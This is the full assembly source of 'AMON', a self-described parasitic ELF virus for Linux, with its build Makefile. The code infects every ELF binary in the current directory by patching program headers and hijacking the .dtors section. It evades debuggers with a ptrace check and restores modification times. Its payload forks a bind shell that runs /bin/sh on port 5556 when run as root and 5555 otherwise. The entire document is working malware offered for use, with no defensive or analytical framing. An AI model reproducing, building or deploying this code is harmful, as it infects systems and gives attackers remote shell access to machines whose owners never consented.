   ;------------------------------------------------------------------------------
   ;
   ;                       AMON by emp && rikenar
   ;                       ----------------------
   ;
   ;
   ;
   ;
   ;
   ; AMON : parasitic ELF virus
   ;
   ;
   ;
   ;
   ;                      Description :
   ;                      -------------
   ;
   ; - Infect all ELF in the current directory.
   ; - Full compatible with all kernel 2.2.x,2.4.x and probably with all 2.6.x.
   ; - Full compatible with all options of kernel security patch (PaX/grsec ...).
   ; - Use basic EPO technic.
   ; - Use basic anti debug trick.
   ; - Bind a shell on port 5556 if UID = 0 else bind a shell on port 5555.
   ; - Only 960 bytes with complete strip.
   ; - Restore date and time of last modification.
   ;
   ;
   ;
   ; Tested on - redhat 9.0 (kernel 2.4.20 && 2.4.21+grsec/PaX)
   ;           - debian 3.0 (kernel 2.2.20 && 2.2.25+PaX)
   ;           - KNOPPIX 3.2 (kernel 2.4.21)
   ;
   ;
   ;
   ;
   ;
   ;
   ;anonymous@neptune ~/code/amon $ cat Makefile
   ;all:
   ;        @echo "-+ amon by rikenar and emp +-"
   ;        nasm -f elf amon.asm
   ;        cc amon.o -o amon -nostdlib
   ;        rm -f amon.o
   ;
   ;strip:
   ;        strip amon
   ;        sstrip amon
   ;
   ;
   ;anonymous@neptune ~/code/amon $ make
   ;-+ amon by rikenar and emp +-
   ;nasm -f elf amon.asm
   ;cc amon.o -o amon -nostdlib
   ;rm -f amon.o
   ;
   ;
   ;anonymous@neptune ~/code/amon $ make strip
   ;strip amon
   ;sstrip amon
   ;
   ;
   ;anonymous@neptune ~/code/amon $ ls -l amon
   ;-rwx------    1 anonymous  anonymous       960 nov  7 01:48 amon
   ;
   ;
   ;
   ;
   ;
   ;greetz : people on #ioc and all our friends
   ;
   ;------------------------------------------------------------------------------

   %define         sys_fork        2
   %define         sys_read        3
   %define         sys_open        5
   %define         sys_close       6
   %define         sys_exec        11
   %define         sys_getpid      20
   %define         sys_getuid      24
   %define         sys_ptrace      26
   %define         sys_kill        37
   %define         sys_dup2        63
   %define         sys_mmap        90
   %define         sys_munmap      91
   %define         sys_ftruncate   93
   %define         sys_socket      102
   %define         sys_fstat       108
   %define         sys_getdents    141

   %define         PT_LOAD         01
   %define         O_RDWR          2
   %define         LISTEN          4
   %define         SIGKILL         9
   %define         ELFMAG          0x464C457F

   global _start

   section .evil

   _start:

   ;ptrace(PTRACE_TRACEME, 0, 0x1, 0)
   ;
   ;
   ;anti debug trick

           xor     eax, eax
           cdq
           inc     edx
           xor     ecx, ecx
           xor     ebx, ebx                ;PTRACE_TRACEME
           xor     esi, esi
           mov      al, sys_ptrace
           int     0x80
           test    eax, eax                ;
           jne     NEAR byebye             ;if code is traced then exit

           call    bomb

   ;----------------------------------------------------------------------------
   ;
   ; find file to infect and call the infection function

           push '.'
           mov  ebx, esp
           call  opendir                   ;open current directory

           call  getdents                  ;list file of this directory

           add  esp, 0x08                  ;next name

   again:
           mov  ebx, esp
           add  ebx, 2
           mov esi, ebx

           call openfile                   ; open file


           cmp   ah, 0xFF                  ; if error on open
           je    nextf                     ; find another file


           call verif                      ; test file type and infection
           test eax, eax                   ;
           je   nextf                      ; find another file

           mov  eax, sys_fstat
           sub  esp, 0x40
           mov  ecx, esp
           int  0x80                       ; file size
           add  esp, 0x40                  ;

           push DWORD [ecx+0x28]
           push DWORD [ecx+0x20]
           push esi                        ; save name of file for utime.

           mov  ecx, [ecx+0x14]            ; ecx = st_size
           mov  esi, ecx

           call infection                  ; WAR IS ON !

           xchg ebx, esi                   ; fd in esi.

           mov eax, 0x1e
           pop ebx
           mov ecx, esp
           int 0x80
           add esp, 8

   nextf:
           xchg esi, ebx                   ; fd in ebx.
           mov eax, sys_close
           int 0x80

           call nextfile                   ; find next file
           test eax, eax
           jne  again

   exit:

   byebye:
           xor eax, eax
           inc eax                         ; bye bye
           xor ebx, ebx
           int 0x80

   ;---------------------------------------------------------------------------
   ;
   ; infection functions

   infection:

           add  ecx, 0x2000
           and  ecx, 0xFFFFF000
           mov  eax, sys_ftruncate         ; size of file multiple of 0x1000
           int  0x80                       ;

           push ebx                        ; save fd
           push ecx                        ; push size of file for unmap
           call Mapping                    ; map file, adress of map in eax.



           xchg esi, ecx
           mov  ebx, [eax+0x1c]
           add  bx, WORD [eax+0x2a]        ; phdr INTERP.
           mov  esi, [eax+ebx+0x04]        ; offset of this phdr.
           push esi
           sub  ecx, esi                   ; size of code to move.
           sub  esp, ecx
           add  esi, eax
           mov  edx, ecx
           mov  edi, esp
           rep  movsb                      ;

           mov  esi, esp
           mov  ecx, edx
           mov  ebx, [eax+0x1c]
           add  bx, WORD [eax+0x2a]
           mov  edi, [eax+ebx+4]
           add  edi, eax
           add  edi, 0x1000
           rep  movsb
           add  esp, edx                   ;

           call PatchSegment               ; Patch segments.
           pop  edi
           push eax
           mov  ecx, edi
           call PatchSection               ; Patch sections.
           pop  eax
           mov  ecx, 0x1000
           add  [eax+0x20], ecx            ; Patch e_shoff.

           call delta
   delta:  pop ebx
           sub ebx, delta                  ; delta offset.

           mov  esi, _start
           add esi, ebx
           add  ebp, edi                   ; ebp = adress of code
           add  edi, eax
           mov  ecx, fin_code - _start
           rep  movsb                      ; write code.

           mov  ebx, eax
           call hijackDtors                ; hijack .dtors.

           pop  ecx                        ; restaure the size
           call Demap
           pop  ebx                        ; restaure fd
           ret

   ;----------------------------------------------------------------------------
   ;
   ;in  : name directory in ebx
   ;out : fd in eax

   opendir:
           xor  eax, eax
           mov   al, sys_open
           xor  ecx, ecx           ;O_RDONLY
           xor  edx, edx           ;
           int  0x80
           ret

   ;-----------------------------------------------------------------------------
   ;
   ;in  : pointer to name of file in ebx
   ;out : fd in ebx

   openfile:
           xor  eax, eax
           mov   al, sys_open      ;open
           xor  ecx, ecx
           mov   cl, O_RDWR
           xor  edx, edx
           int  0x80
           ret

   ;-----------------------------------------------------------------------------
   ;
   ;in  : directory fd in eax
   ;out : result of getdents on stack

   getdents:
           pop  esi                ;save ret addr
           sub  esp, 0x10000       ;i want some place on stack

           xchg eax, ebx
           xor  eax, eax
           mov   al, sys_getdents
           mov  ecx, esp
           mov  edx, 0x10000
           int  0x80

           push esi                ;

           ret

   ;-----------------------------------------------------------------------------
   ;
   ;in  : file fd in eax
   ;out : ebx == NULL if file type false or infection true

   verif:
           xchg ebx, eax
           call read

           cmp  eax, ELFMAG                ;if file is not an ELF
           je verifsuite

           xor eax, eax                    ;eax == 0
           ret                             ;

   verifsuite:

           ;check infection
           mov  eax, sys_fstat
           sub  esp, 0x40
           mov  ecx, esp
           int  0x80
           add  esp, 0x40

           xor edx, edx

           mov eax, [ecx+0x14]
           mov ecx, 0x1000
           div ecx
           test edx, edx          ; is file align on 0x1000 ?
           jne notinfected        ; if no file is not infected, infection FALSE
           xor eax, eax           ; else infection TRUE

   notinfected:
           ret

   ;----------------------------------------------------------------------------
   ;
   ;in  : pointer of file name in esp
   ;out : pointer of next file name in esp

   nextfile:
           pop  ebx                ; save ret adress
           xor  eax, eax
           mov   al, [esp]         ; eax = offsset next name
           add  esp, eax           ;
           mov   al, [esp]         ;
           push ebx                ;
           ret

   ;---------------------------------------------------------------------------
   ;
   ;in  : fd in ebx
   ;out : result of read in eax

   read:
           xor  eax, eax
           mov   al, sys_read
           sub  esp, 4             ;
           mov  ecx, esp
           mov  edx, 4
           int  0x80               ;
           pop eax                 ; dword read in eax
           ret

   ;-------------------------------------------------------------------------------
   ;
   ;in  : fd file in ebx
   ;out : pointer of map file in eax

   Mapping:

           xor  edx, edx
           push edx
           push ebx
           inc  edx
           push edx
           inc  edx
           inc  edx
           push edx
           push ecx
           xor  eax, eax
           push eax
           mov   al, sys_mmap
           xchg ebx, edx
           mov  ebx, esp
           int  0x80
           xchg ebx, edx
           add  esp, 0x18

           ret

   ;-------------------------------------------------------------------------------
   ;
   ;in  : ecx size of mapping
   ;out : eax == 0 if succes
   Demap:

           xor  eax, eax
           mov   al, sys_munmap
           xor  ebx, ebx
           int  0x80

           ret

   ;-------------------------------------------------------------------------------
   ;
   ;in  :
   ;out :

   PatchSegment:
           xor  ecx, ecx
           mov  cl, BYTE [eax+0x2c]; ecx = number of segments

           mov  edx, [eax+0x1c]    ; edx pointer to phdr
           add  edx, eax

   rygo:
           push ecx                ;
           mov  ecx, 0x06
           cmp  [edx], ecx         ;
           jne  hi
           mov  ecx, 0x1000
           sub  [edx+0x08], ecx
           sub  [edx+0x0c], ecx    ; patch phdr.
           jmp  ha

   hi:     xor  ecx, ecx
           cmp  [edx+0x04], ecx    ; test if TEXT segment.
           jne  ho
           mov  ecx, 0x1000
           sub  [edx+0x08], ecx
           sub  [edx+0x0c], ecx
           add  [edx+0x10], ecx
           add  [edx+0x14], ecx    ; patch phdr.
           mov  ebp, [edx+08h]     ; ebp pointer to viral code
           jmp  ha

   ho:     mov  ecx, 0x1000
           add  [edx+04], ecx      ; add a memory segment
   ha:

           pop  ecx
           dec  ecx
           test ecx, ecx           ; other segments ?
           je   good               ;
           add  dl, BYTE [eax+0x2a]; if yes we go patch the other
           jmp rygo

   good:
           ret

   ;----------------------------------------------------------------------------
   ;
   ;in  :
   ;out :

   PatchSection:

           mov edx, [eax+0x20]
           add edx, eax
           add edx, 0x1000          ; e_shoff
           xor ecx, ecx
           mov cx, [eax+0x30]       ; nbre de section.
           dec ecx
           xor esi, esi
           mov si, [eax+0x2E]       ; e_shentsize
   patch:
           add edx, esi
           mov ebx, [edx+0x10]      ; sh_offset
           add ebx, 0x1000
           mov [edx+0x10], ebx
           loop patch
           ret

   ;-----------------------------------------------------------------------------
   ;in  : pointer to adress of file mmaping in ebx
   ;out : eax == 0 if functions fail

   hijackDtors:

   ;find the sh_offset of .shstrtab(e_shentsize*e_shstrndx+e_shoff+adresse map)
           xor  eax, eax
           mov   ax, [ebx+0x2E]            ; e_shentsize
           mov   cl, [ebx+0x32]            ; e_shstrndx on 8bits!!!(nb_section<255)

           mul   cl                        ;
                                           ;

           add  eax, [ebx+0x20]            ; + e_shoff == offset shdr .shstrtab
           add  eax, ebx                   ; + adress of file maping
           mov  esi, eax
           add  esi, 0x10                  ; sh_offset of .shstrtab

   ;looking for .dtors in sh_name of each sections
           xor  eax, eax
           mov  eax, [ebx+0x20]            ; offset shdr
           add  eax, ebx                   ;

           xor  ecx, ecx
           mov  cx, [ebx+0x30]            ; e_shnum

           mov  edi, [esi]                 ; edi == offset .shstrtab
           add  edi, ebx                   ;

           xor edx, edx


   next_shname:
           xor  edx, edx
           mov   dx, WORD [ebx+0x2E]
           add  eax, edx                   ; next shdr (we don't read the first)
           mov  esi, [eax]
           add  esi, edi
           mov  edx, [esi]
           cmp  edx, '.dto'
           je   dtor_finding

           loop next_shname

           xor  eax, eax                   ; if don't find it
           ret                             ;

   ;find the last entry in .dtors tab, and write a new entry :)

   dtor_finding:
           mov  ecx, [eax+0x10]            ; sh_offset of .dtors
           add  ecx, ebx                   ; + map

   next_dtor:
           add  ecx, 4                     ; don't check the first entry (must
           mov  edx, [ecx]                 ; be 0xFFFFFFFF)
           cmp  edx, 0
           jne  next_dtor

           mov DWORD [ecx], ebp            ; offset of viral code

           ret

   ;----------------------------------------------------------------------------
   ;bind a shell on port 5556 if uid = 0 else bind a shell on port 5555

   bomb:
           xor     eax, eax
           mov      al, sys_fork   ;fork the logical bomb
           int     0x80

           test    eax, eax
           je      bindshell       ; the son bind the shell

           ret                     ; the father exit

   bindshell:
   ;socket(family, type, proto)

           xor     eax, eax
           cdq
           mov      al, sys_socket
           push    edx              ; 0=IP
           inc     edx
           push    edx              ; 1=SOCK_STREAM
           inc     edx
           push    edx             ; 2=AF_INET

           mov     ecx, esp
           push    byte 1
           pop     ebx             ; 1 -> socket
           int     0x80

   ;bind(socket, addr, lenng)
           mov     edi, eax
           cdq
           xor     ecx, ecx
           mov      cx, 0xB315
           xor     eax, eax
           mov      al, sys_getuid
           int     0x80
           test    eax, eax        ;if uid != 0
           jne     binduser        ;goto binduser
           inc     ch              ;

   binduser:
           push    edx
           push    word cx         ; port = 5556 if uid(0) else port =  5555
           inc     ebx
           push    bx              ; (0002 = AF_INET)
           mov     ecx, esp        ; ecx = offset sockaddr struct
           push    byte 16         ; len
           push    ecx             ; push offset sockaddr struct
           push    edi             ; handle socket
           mov     ecx, esp
           xor     eax, eax
           mov     al, sys_socket
           int     0x80

   ;If bind fail the process send to himself a SIGKILL
           test    eax, eax
           je      listen
           xor     eax, eax
           mov      al, sys_getpid
           int     0x80

           xchg    ebx, eax
           xor     ecx, ecx
           mov      cl, SIGKILL
           xor     eax, eax
           mov      al, sys_kill
           int     0x80

   ;listen(socket, backlog)
   listen:
           mov      al, sys_socket
           mov      bl, LISTEN
           int     0x80

   ;accept(socket, addr, len)
           push    eax
           push    edi
           mov     ecx, esp
           inc     ebx             ; 5 -> accept
           mov      al, sys_socket
           int     0x80

   ;dup2()
   dup:
           mov     ecx, ebx
           mov     ebx, eax
           dec     ecx
           mov      al, sys_dup2
           int     0x80
           inc     ecx
           loop    dup

   ;execve /bin/sh
           mov     al, sys_exec
           push    ecx
           push    0x68732f6e
           push    0x69622f2f
           mov     ebx, esp
           push    ecx
           push    ebx
           mov     ecx, esp
           int     0x80

   fin_code:
